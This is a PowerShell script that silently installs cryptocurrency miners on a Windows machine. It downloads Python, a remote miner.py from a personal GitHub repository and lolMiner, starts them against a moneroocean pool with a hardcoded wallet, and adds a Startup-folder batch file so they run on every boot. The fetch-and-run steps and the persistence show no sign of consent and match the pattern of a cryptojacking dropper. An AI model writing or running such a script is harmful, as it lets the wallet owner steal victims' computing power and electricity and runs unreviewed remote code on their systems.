$dir="$env:USERPROFILE\mh"
mkdir $dir -Force

# Download Python + CPU miner
iwr "https://www.python.org/ftp/python/3.11.0/python-3.11.0-embed-amd64.zip" -o "$dir\py.zip"
Expand-Archive "$dir\py.zip" -Destination "$dir\python" -Force
iwr "https://raw.githubusercontent.com/max1734601-cpu/mining-dashboard/main/miner.py" -o "$dir\miner.py"

# Download GPU miner (lolMiner - works for AMD and NVIDIA)
iwr "https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.82a/lolMiner_v1.82a_Win64.zip" -o "$dir\gpu.zip"
Expand-Archive "$dir\gpu.zip" -Destination "$dir\gpu" -Force

# Start both
Start-Process "$dir\python\python.exe" "$dir\miner.py"
Start-Process "$dir\gpu\1.82a\lolMiner.exe" "--algo AUTOLYKOS2 --pool gulf.moneroocean.stream:10032 --user 4465bM7hTwiMHE3ka1foxQMou8YsrMtR4RYFmyJF23KSSp6fHtDcE8LUcUrRbKTQEJPYkKgUqfDyG6TvmcwRJ8UUHVxpc9o.GPU"

# Startup on boot (both)
$bat="@echo off`r`nstart $dir\python\python.exe $dir\miner.py`r`nstart $dir\gpu\1.82a\lolMiner.exe --algo AUTOLYKOS2 --pool gulf.moneroocean.stream:10032 --user 4465bM7hTwiMHE3ka1foxQMou8YsrMtR4RYFmyJF23KSSp6fHtDcE8LUcUrRbKTQEJPYkKgUqfDyG6TvmcwRJ8UUHVxpc9o.GPU"
Set-Content "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\mh.bat" $bat
